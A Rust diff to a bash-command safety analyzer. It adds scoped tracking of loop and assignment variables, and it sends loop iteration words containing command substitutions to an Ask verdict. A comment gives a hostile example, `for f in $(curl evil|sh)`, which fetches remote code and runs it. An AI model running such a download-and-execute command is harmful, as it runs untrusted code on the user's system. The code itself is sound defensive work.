@@ -11,7 +11,7 @@ use crate::environment::Environment;
 use crate::error::RippyError;
 use crate::handlers::{self, Classification, HandlerContext};
 use crate::parser::BashParser;
-use crate::resolve::{self, VarLookup};
+use crate::resolve::{self, LocalBinding, VarLookup};
 use crate::verdict::{Decision, Verdict};
 
 const MAX_DEPTH: usize = 256;
@@ -56,6 +56,11 @@ pub struct Analyzer {
     /// `MAX_NODES` at the top of every public `analyze` call and decremented
     /// once per `analyze_node` entry. Returns Ask when exhausted.
     node_budget: usize,
+    /// Command-local variable bindings in effect for the node being analyzed:
+    /// for/select loop variables, literal `VAR=val` prefixes, and prior literal
+    /// assignments in a list. Managed with a strict checkpoint/truncate
+    /// discipline so a binding never leaks past its lexical scope.
+    locals: Vec<(String, LocalBinding)>,
 }
 
 impl Analyzer {
@@ -82,6 +87,7 @@ impl Analyzer {
             var_lookup: env.var_lookup,
             resolution_depth: 0,
             node_budget: MAX_NODES,
+            locals: Vec::new(),
         })
     }
 
@@ -200,14 +206,7 @@ impl Analyzer {
         }
         self.node_budget -= 1;
         match &node.kind {
-            NodeKind::Command { assignments, .. }
-                if Self::assignment_has_expansion(assignments) =>
-            {
-                Verdict::ask("assignment with expansion")
-            }
-            NodeKind::Command {
-                words, redirects, ..
-            } => self.analyze_command_node(words, redirects, cwd, depth),
+            NodeKind::Command { .. } => self.analyze_command(node, cwd, depth),
             NodeKind::Pipeline { commands, .. } => self.analyze_pipeline(commands, cwd, depth),
             NodeKind::List { items } => self.analyze_list(items, cwd, depth),
             NodeKind::If { .. }
@@ -276,13 +275,10 @@ impl Analyzer {
                 body,
                 redirects,
             } => self.analyze_compound(&[condition.as_ref(), body.as_ref()], redirects, cwd, depth),
-            NodeKind::For {
-                body, redirects, ..
+            NodeKind::For { .. } | NodeKind::Select { .. } => {
+                self.analyze_loop_binding(node, cwd, depth)
             }
-            | NodeKind::ForArith {
-                body, redirects, ..
-            }
-            | NodeKind::Select {
+            NodeKind::ForArith {
                 body, redirects, ..
             }
             | NodeKind::BraceGroup { body, redirects } => {
@@ -338,12 +334,18 @@ impl Analyzer {
     }
 
     fn analyze_list(&mut self, items: &[rable::ListItem], cwd: &Path, depth: usize) -> Verdict {
+        // Checkpoint so literal assignments registered for later items in this
+        // list (`SCRATCH=/tmp; ls $SCRATCH`) never leak into a sibling scope.
+        let checkpoint = self.locals.len();
         let mut verdicts = Vec::new();
         let mut current_cwd = cwd.to_owned();
         let mut is_harmless_fallback = false;
 
         for (i, item) in items.iter().enumerate() {
             let v = self.analyze_node(&item.command, &current_cwd, depth + 1);
+            // Register standalone literal assignments so subsequent list items
+            // (but nothing outside this list) can resolve them.
+            self.register_list_bindings(&item.command);
 
             if let Some(dir) = extract_cd_target(&item.command) {
                 current_cwd = if Path::new(&dir).is_absolute() {
@@ -371,7 +373,110 @@ impl Analyzer {
             verdicts.push(v);
         }
 
+        self.locals.truncate(checkpoint);
         Verdict::combine(&verdicts)
+    }
+
+    /// Push literal `VAR=val` bindings from a command's assignment nodes onto
+    /// the locals stack. Non-literal values (expansions) are skipped — they are
+    /// never bound and remain subject to the assignment-expansion guard.
+    fn push_literal_bindings(&mut self, assignments: &[Node]) {
+        for a in assignments {
+            if let Some((name, val)) = ast::literal_assignment(a) {
+                self.locals.push((name, LocalBinding::Literal(val)));
+            }
+        }
+    }
+
+    /// Register the literal assignments of a *standalone* assignment command
+    /// (`SCRATCH=/tmp/x` with no command word) so later items in the same list
+    /// can resolve them. Commands that carry a word bind their prefix only for
+    /// their own duration (handled in the `Command` arm), so they are skipped.
+    fn register_list_bindings(&mut self, node: &Node) {
+        let NodeKind::Command {
+            assignments, words, ..
+        } = &node.kind
+        else {
+            return;
+        };
+        if words.is_empty() {
+            self.push_literal_bindings(assignments);
+        }
+    }
+
+    /// Analyze a simple `Command` node.
+    ///
+    /// Applies the assignment-expansion guard (`x=$(cmd)` → Ask), then binds any
+    /// literal `VAR=val` prefix for the duration of this one command so
+    /// `VAR=val cmd $VAR` resolves within it, and unwinds the binding afterward.
+    fn analyze_command(&mut self, node: &Node, cwd: &Path, depth: usize) -> Verdict {
+        let NodeKind::Command {
+            words,
+            redirects,
+            assignments,
+        } = &node.kind
+        else {
+            return Verdict::allow("");
+        };
+        if Self::assignment_has_expansion(assignments) {
+            return Verdict::ask("assignment with expansion");
+        }
+        let checkpoint = self.locals.len();
+        self.push_literal_bindings(assignments);
+        let v = self.analyze_command_node(words, redirects, cwd, depth);
+        self.locals.truncate(checkpoint);
+        v
+    }
+
+    /// Analyze a `for`/`select` loop that binds an iteration variable.
+    ///
+    /// The iteration `words` are analyzed first (in the outer scope) so a
+    /// dangerous expansion there — `for f in $(curl evil|sh)` — can no longer
+    /// skip analysis. The loop variable is then bound as [`LocalBinding::Dynamic`]
+    /// (set, value unknown) while the body is analyzed, and unwound afterward.
+    fn analyze_loop_binding(&mut self, node: &Node, cwd: &Path, depth: usize) -> Verdict {
+        let (NodeKind::For {
+            var,
+            words,
+            body,
+            redirects,
+        }
+        | NodeKind::Select {
+            var,
+            words,
+            body,
+            redirects,
+        }) = &node.kind
+        else {
+            return Verdict::allow("");
+        };
+        let checkpoint = self.locals.len();
+        let mut verdicts = self.analyze_iteration_words(words.as_deref());
+        self.locals.push((var.clone(), LocalBinding::Dynamic));
+        verdicts.push(self.analyze_node(body, cwd, depth + 1));
+        verdicts.extend(self.analyze_redirects(redirects, cwd, depth));
+        self.locals.truncate(checkpoint);
+        Verdict::combine(&verdicts)
+    }
+
+    /// Check a loop's iteration words for unresolvable expansions (command or
+    /// process substitution). Literal words and globs resolve fine and produce
+    /// no verdict; an unresolvable word yields an Ask so the substitution is not
+    /// silently executed. Uses the current locals scope (loop var not yet bound).
+    fn analyze_iteration_words(&self, words: Option<&[Node]>) -> Vec<Verdict> {
+        let Some(words) = words else {
+            return Vec::new();
+        };
+        let scoped = resolve::ScopedLookup::new(&self.locals, self.var_lookup.as_ref());
+        words
+            .iter()
+            .filter_map(|w| match resolve::resolve_word(w, &scoped) {
+                resolve::WordResolution::Unresolvable { reason } => {
+                    Some(Verdict::ask(format!("shell expansion ({reason})")))
+                }
+                _ => None,
+            })
+            .collect()
     }
 
     fn analyze_compound(
@@ -669,7 +774,18 @@ impl Analyzer {
         if self.resolution_depth >= MAX_RESOLUTION_DEPTH {
             return Some(Verdict::ask("shell expansion (resolution depth exceeded)"));
         }
-        let resolved = resolve::resolve_command_args(words, self.var_lookup.as_ref());
+        let resolved = {
+            let scoped = resolve::ScopedLookup::new(&self.locals, self.var_lookup.as_ref());
+            resolve::resolve_command_args(words, &scoped)
+        };
+        // A set-but-unknown value in argument position: we never fabricate its
+        // value. Allow only if the literal command name is in SIMPLE_SAFE —
+        // those commands are safe regardless of their argument *values* (they
+        // cannot write or execute based on an arg). Every handler/wrapper/unknown
+        // command with a dynamic argument stays Ask, exactly as before.
+        if resolved.arg_position_dynamic && !resolved.command_position_dynamic {
+            return Some(self.dynamic_arg_verdict(words));
+        }
         let Some(args) = resolved.args else {
             let reason = resolved.failure_reason.map_or_else(
                 || "shell expansion".to_string(),
@@ -698,6 +814,26 @@ impl Analyzer {
         let inner = self.analyze_inner_command(&resolved_command, cwd, depth + 1);
         self.resolution_depth -= 1;
         Some(annotate_with_resolution(inner, &resolved_command))
+    }
+
+    /// Verdict for a command with a dynamic-known argument (`$loopvar`, `$?`).
+    ///
+    /// SECURITY INVARIANT: this is the *only* place a dynamic argument relaxes
+    /// the verdict, and it does so strictly for `SIMPLE_SAFE` commands, whose
+    /// safety does not depend on argument values (pure readers/printers such as
+    /// `cat`/`echo`/`wc`/`ls`). A handler command (`rm`, `git`, ...) whose
+    /// behavior depends on its arguments always stays Ask, because a fabricated
+    /// or word-split value could otherwise hide an injected dangerous flag.
+    fn dynamic_arg_verdict(&self, words: &[Node]) -> Verdict {
+        let Some(raw_name) = ast::command_name_from_words(words) else {
+            return Verdict::ask("shell expansion ($VAR dynamic)");
+        };
+        let name = self.config.resolve_alias(raw_name);
+        if allowlists::is_simple_safe(name) {
+            Verdict::allow(format!("{name} is safe (dynamic arg)"))
+        } else {
+            Verdict::ask("shell expansion ($VAR dynamic)")
+        }
     }
 
     fn apply_classification(&mut self, class: Classification, cwd: &Path, depth: usize) -> Verdict {
